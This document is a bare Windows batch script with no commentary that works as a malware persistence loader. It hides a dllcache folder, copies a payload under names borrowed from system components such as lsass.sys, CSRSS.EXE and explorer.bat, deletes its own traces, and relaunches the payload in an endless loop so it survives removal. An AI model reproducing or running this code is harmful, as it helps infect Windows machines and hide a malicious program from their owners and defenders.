@echo off
:primary
if NOT exist C:\WINNT\System32\rundll32.com goto :copymain
if exist C:\WINNT\System32\dllcache\explorer.bat goto :main
:secondary
mkdir C:\WINNT\System32\dllcache
copy C:\WINNT\System32\explorer.bat C:\WINNT\System32\dllcache\explorer.bat
cmd /C attrib +s +h C:\WINNT\System32\dllcache
C:\WINNT\System32\dllcache\explorer.bat
del C:\WINNT\System32\explorer.bat
:main
C:\WINNT\System32\rundll32.com
copy C:\WINNT\System32\explorer.bat C:\WINNT\System32\dllcache\explorer.bat
del C:\WINNT\System32\explorer.bat
cmd /C attrib -s -h C:\WINNT\System32\rundll32.com
if exist C:\WINNT\System32\rundll32.com copy C:\WINNT\System32\rundll32.com C:\WINNT\System32\dllcache\lsass.sys
cmd /C attrib +s +h C:\WINNT\System32\rundll32.com
:repeat
copy C:\WINNT\System32\dllcache\lsass.sys C:\WINNT\System32\dllcache\CSRSS.EXE
copy C:\WINNT\System32\dllcache\lsass.sys C:\WINNT\System32\ilu.com
copy C:\WINNT\System32\dllcache\lsass.sys C:\WINNT\System32\dllcache\ilu.com
copy C:\WINNT\System32\dllcache\lsass.sys C:\WINNT\System32\omg.exe
copy C:\WINNT\System32\dllcache\lsass.sys C:\WINNT\System32\dllcache\omg.exe
C:\WINNT\System32\dllcache\CSRSS.EXE
@ping 127.0.0.1 -n 2 -w 1000> nul
@ping 127.0.0.1 -n 15 -w 1000> nul
goto :repeat
:copymain
copy C:\WINNT\System32\dllcache\lsass.sys C:\WINNT\System32\rundll32.com 
C:\WINNT\System32\rundll32.com
goto :primary
